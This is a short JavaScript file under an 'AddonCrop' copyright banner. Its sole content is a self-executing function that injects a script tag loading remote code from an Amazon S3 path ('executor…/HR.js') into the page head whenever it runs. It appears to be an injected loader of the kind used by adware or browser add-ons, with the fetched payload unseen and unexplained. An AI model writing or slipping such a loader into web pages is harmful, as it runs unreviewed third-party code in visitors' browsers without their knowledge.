/*! AddonCrop | (c) 2014, 2017 AddonCrop, Inc. | AddonCrop.com/copyright */

(function() {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = '//executor.s3.amazonaws.com/rex2w8brqvvt/HR.js';
    head.appendChild(script);
})();